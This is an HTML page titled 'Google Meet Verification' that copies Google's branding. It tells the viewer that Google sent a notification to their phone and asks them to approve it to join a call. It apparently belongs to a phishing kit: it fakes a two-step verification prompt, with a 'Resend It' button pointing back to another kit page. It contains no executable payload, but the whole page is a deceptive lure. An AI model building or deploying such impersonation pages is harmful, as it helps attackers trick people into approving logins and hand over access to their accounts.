<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Google Meet Verification</title>
  <link rel="icon" href="https://www.gstatic.com/images/branding/product/1x/meet_2020q4_48dp.png">
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <img class="logo" src="logo.png" alt="Google Meet logo">
    <h1></h1>
    <p>Google Wants to make sure it's really you trying to join a Google Meet video call.</p>

    <img class="phone" src="../icon.gif" alt="Phone gif">

    <h2>Check Your Phone</h2>
    <p>Google sent a notification to your phone.<br>Tap yes on the notification, then tap the meeting code to join the video call.</p>

    <div class="checkbox">
      <input type="checkbox" id="dontask">
      <label for="dontask">Don't ask again on this device</label>
    </div>

    <button onclick="window.location.href='../index.html'">Resend It</button>
  </div>
</body>
</html>
